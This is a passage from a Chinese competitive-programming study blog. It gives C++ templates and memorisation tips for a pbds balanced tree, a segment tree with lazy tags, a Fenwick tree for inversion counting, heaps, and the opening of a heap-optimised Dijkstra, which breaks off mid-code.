_stack[N],pt,vis[N];</span><br><span class="line">Tree tr;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">tr.<span class="built_in">insert</span>(<span class="number">0</span>);</span><br><span class="line">tr.<span class="built_in">insert</span>(n+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">char</span> op;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">cin&gt;&gt;op;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">cin&gt;&gt;x;</span><br><span class="line">_stack[++pt] = x;</span><br><span class="line">vis[x] = <span class="number">1</span>;</span><br><span class="line">tr.<span class="built_in">insert</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">x = _stack[pt];</span><br><span class="line">tr.<span class="built_in">erase</span>(x);</span><br><span class="line">vis[x] = <span class="number">0</span>;</span><br><span class="line">pt--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">cin&gt;&gt;x;</span><br><span class="line"><span class="keyword">if</span>(vis[x])cout&lt;&lt;<span class="string">&quot;0\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">auto</span> it1 = tr.<span class="built_in">lower_bound</span>(x); <span class="comment">// &gt;=</span></span><br><span class="line"><span class="keyword">auto</span> it2 = tr.<span class="built_in">upper_bound</span>(x); <span class="comment">// &gt;</span></span><br><span class="line">it1--; <span class="comment">// &lt;</span></span><br><span class="line"><span class="type">int</span> a = *it1,b = *it2;</span><br><span class="line">cout&lt;&lt;b-a<span class="number">-1</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里体现了用STL做题一个很重要的步骤 开局设置起始值和结束值！！！<br>pbds的板子要背一背 头文件和命名空间都要背住</p><h2 id="P3369-【模板】普通平衡树"><a href="#P3369-【模板】普通平衡树" class="headerlink" title="P3369 【模板】普通平衡树"></a>P3369 【模板】普通平衡树</h2><p>用pbds+pair时间戳 实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ext/pb_ds/assoc_container.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ext/pb_ds/tree_policy.hpp&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line">using namespace __gnu_cxx;</span><br><span class="line">using namespace __gnu_pbds;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="keyword">typedef</span> tree&lt;pii,null_type,less&lt;pii&gt;,rb_tree_tag,tree_order_statistics_node_update&gt; Tree;</span><br><span class="line">Tree tr;</span><br><span class="line"><span class="type">int</span> times,n;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> &amp;x)</span>&#123;</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> f = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> ch = getchar();</span><br><span class="line"><span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">ch = getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">x = <span class="number">10</span>*x+ch<span class="number">-48</span>;</span><br><span class="line">ch = getchar();</span><br><span class="line">&#125;</span><br><span class="line">x = x*f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>),x = -x;</span><br><span class="line"><span class="keyword">if</span>(x&gt;<span class="number">9</span>)write(x/<span class="number">10</span>);</span><br><span class="line"><span class="built_in">putchar</span>(x%<span class="number">10</span>+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">read(n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="type">int</span> op,x;</span><br><span class="line">read(op),read(x);</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">times++;</span><br><span class="line">tr.insert(mp(x,times));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">auto</span> it = tr.lower_bound(mp(x,<span class="number">0</span>));</span><br><span class="line">tr.erase(it);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="type">int</span> rk = tr.order_of_key(mp(x,<span class="number">0</span>))+<span class="number">1</span>;</span><br><span class="line">write(rk);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">auto</span> it = tr.find_by_order(x<span class="number">-1</span>);</span><br><span class="line"><span class="type">int</span> val = it-&gt;first;</span><br><span class="line">write(val);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">auto</span> it = tr.lower_bound(mp(x,<span class="number">0</span>));</span><br><span class="line">it--;</span><br><span class="line"><span class="type">int</span> val = it-&gt;first;</span><br><span class="line">write(val);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">auto</span> it = tr.upper_bound(mp(x,n+<span class="number">1</span>));</span><br><span class="line"><span class="type">int</span> val = it-&gt;first;</span><br><span class="line">write(val);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>背板子注意细节！！！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insert</span></span><br><span class="line">times++;</span><br><span class="line">tr.insert(mp(x,times));</span><br><span class="line"></span><br><span class="line"><span class="comment">// delete only one</span></span><br><span class="line"><span class="keyword">auto</span> it = tr.lower_bound(mp(x,<span class="number">0</span>));</span><br><span class="line">tr.erase(it);</span><br><span class="line"></span><br><span class="line"><span class="comment">// find kth</span></span><br><span class="line"><span class="keyword">auto</span> it = tr.find_by_order(k<span class="number">-1</span>);</span><br><span class="line"><span class="type">int</span> val = it-&gt;first;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the order of x</span></span><br><span class="line"><span class="type">int</span> rk = tr.order_of_key(x)+<span class="number">1</span>; <span class="comment">//0-&gt;1 so we +1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// find pre</span></span><br><span class="line"><span class="keyword">auto</span> it = tr.lower_bound(mp(x,<span class="number">0</span>));</span><br><span class="line">it--;</span><br><span class="line"><span class="type">int</span> val = it-&gt;first;</span><br><span class="line"></span><br><span class="line"><span class="comment">// find after</span></span><br><span class="line"><span class="keyword">auto</span> it = tr.upper_bound(mp(x,n+<span class="number">1</span>));</span><br><span class="line"><span class="type">int</span> val = it-&gt;first;</span><br></pre></td></tr></table></figure><h2 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h2><p>直接打线段树2的板子<br>注意细节！！！ 先乘后加 mul始终不能为0 更新完懒标记后要<br><code>tr[p].add = 0</code>   <code>tr[p].mul = 1</code> !!!<br>建树<code>build</code>的时候 mid取的是 <code>(l+r)&gt;&gt;1</code> !!!<br>而且query和modify都要记得pushdown!!!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m,mod,a[N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegTree</span>&#123;</span></span><br><span class="line"><span class="type">int</span> l,r,sum,add,mul;</span><br><span class="line">&#125;tr[N&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">MOD</span><span class="params">(<span class="type">int</span> &amp;x)</span>&#123;</span><br><span class="line">x = (x%mod+mod)%mod;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pushup</span><span class="params">(<span class="type">int</span> p)</span>&#123;</span><br><span class="line">tr[p].sum = tr[p&lt;&lt;<span class="number">1</span>].sum + tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">MOD(tr[p].sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pushdown</span><span class="params">(<span class="type">int</span> p)</span>&#123;</span><br><span class="line">tr[p&lt;&lt;<span class="number">1</span>].sum = tr[p].mul*tr[p&lt;&lt;<span class="number">1</span>].sum + tr[p].add*(tr[p&lt;&lt;<span class="number">1</span>].r-tr[p&lt;&lt;<span class="number">1</span>].l+<span class="number">1</span>);</span><br><span class="line">MOD(tr[p&lt;&lt;<span class="number">1</span>].sum);</span><br><span class="line">tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum = tr[p].mul*tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum + tr[p].add*(tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].r-tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].l+<span class="number">1</span>);</span><br><span class="line">MOD(tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum);</span><br><span class="line">tr[p&lt;&lt;<span class="number">1</span>].add = tr[p].mul*tr[p&lt;&lt;<span class="number">1</span>].add + tr[p].add;</span><br><span class="line">MOD(tr[p&lt;&lt;<span class="number">1</span>].add);</span><br><span class="line">tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].add = tr[p].mul*tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].add + tr[p].add;</span><br><span class="line">MOD(tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].add);</span><br><span class="line">tr[p&lt;&lt;<span class="number">1</span>].mul = tr[p].mul*tr[p&lt;&lt;<span class="number">1</span>].mul;</span><br><span class="line">MOD(tr[p&lt;&lt;<span class="number">1</span>].mul);</span><br><span class="line">tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].mul = tr[p].mul*tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].mul;</span><br><span class="line">MOD(tr[p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].mul);</span><br><span class="line"></span><br><span class="line">tr[p].add = <span class="number">0</span>;</span><br><span class="line">tr[p].mul = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">build</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> l,<span class="type">int</span> r)</span>&#123;</span><br><span class="line">tr[p].l = l,tr[p].r = r,tr[p].add = <span class="number">0</span>,tr[p].mul = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">tr[p].sum = a[l];</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">build(p&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">build(p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">pushup(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">modify</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> add,<span class="type">int</span> mul)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l&lt;=tr[p].l&amp;&amp;r&gt;=tr[p].r)&#123;</span><br><span class="line">tr[p].sum = mul*tr[p].sum + add*(tr[p].r-tr[p].l+<span class="number">1</span>);</span><br><span class="line">tr[p].add = mul*tr[p].add + add;</span><br><span class="line">tr[p].mul = mul*tr[p].mul;</span><br><span class="line">MOD(tr[p].sum);</span><br><span class="line">MOD(tr[p].mul);</span><br><span class="line">MOD(tr[p].add);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">pushdown(p);</span><br><span class="line"><span class="type">int</span> mid = (tr[p].l+tr[p].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(l&lt;=mid)modify(p&lt;&lt;<span class="number">1</span>,l,r,add,mul);</span><br><span class="line"><span class="keyword">if</span>(r&gt;mid)modify(p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r,add,mul);</span><br><span class="line">pushup(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> l,<span class="type">int</span> r)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l&lt;=tr[p].l&amp;&amp;r&gt;=tr[p].r)<span class="keyword">return</span> tr[p].sum;</span><br><span class="line">pushdown(p);</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> mid = (tr[p].l+tr[p].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(l&lt;=mid)sum += query(p&lt;&lt;<span class="number">1</span>,l,r),MOD(sum);</span><br><span class="line"><span class="keyword">if</span>(r&gt;mid)sum += query(p&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r),MOD(sum);</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;mod;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line"><span class="keyword">while</span>(m--)&#123;</span><br><span class="line"><span class="type">int</span> op,x,y,k;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;op&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">MOD(k);</span><br><span class="line">modify(<span class="number">1</span>,x,y,<span class="number">0</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">MOD(k);</span><br><span class="line">modify(<span class="number">1</span>,x,y,k,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="type">int</span> sum = query(<span class="number">1</span>,x,y);</span><br><span class="line">MOD(sum);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h2><p>以树状数组求逆序对为例<br>离散化过后置1求和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> tr[N],b[N],a[N],c[N],n;</span><br><span class="line"><span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(;p&lt;=n;p+=lowbit(p))</span><br><span class="line">tr[p] += x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> p)</span>&#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;p;p-=lowbit(p))&#123;</span><br><span class="line">sum += tr[p];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">cin</span>&gt;&gt;b[i],c[i] = b[i];</span><br><span class="line"><span class="comment">//离散化</span></span><br><span class="line">sort(b+<span class="number">1</span>,b+n+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">a[i] = lower_bound(b+<span class="number">1</span>,b+n+<span class="number">1</span>,c[i])-b;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">update(a[i],<span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> sum = query(a[i]);</span><br><span class="line">ans += i-sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>树状数组核心操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(;p&lt;=n;p+=lowbit(p))</span><br><span class="line">tr[p] += x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> p)</span>&#123; <span class="comment">// sum(tr[0],...tr[p])</span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;p;p-=lowbit(p))&#123;</span><br><span class="line">sum += tr[p];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>优先队列实现<br>默认是大根堆<br><code>priority_queue&lt;int&gt;q;</code><br>小根堆:<br><code>priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;q;</code></p><p>当然也可以像dijkstra那样自定义结构体在结构体里面实现重载运算符<br>或者自己再写一个cmp结构体重载 <code>()</code>运算符</p><h1 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h1><h2 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h2><p>掌握 Floyd&#x2F;堆优化的Dijkstra&#x2F;处理负权的SPFA<br>借此重新捡起来图论的前向星建图</p><h3 id="堆优化Dijkstra"><a href="#堆优化Dijkstra" class="headerlink" title="堆优化Dijkstra"></a>堆优化Dijkstra</h3><p>注意vis没用 然后要判断一下 <code>dis[u]!=d</code> 可以大大加速</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m,s;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 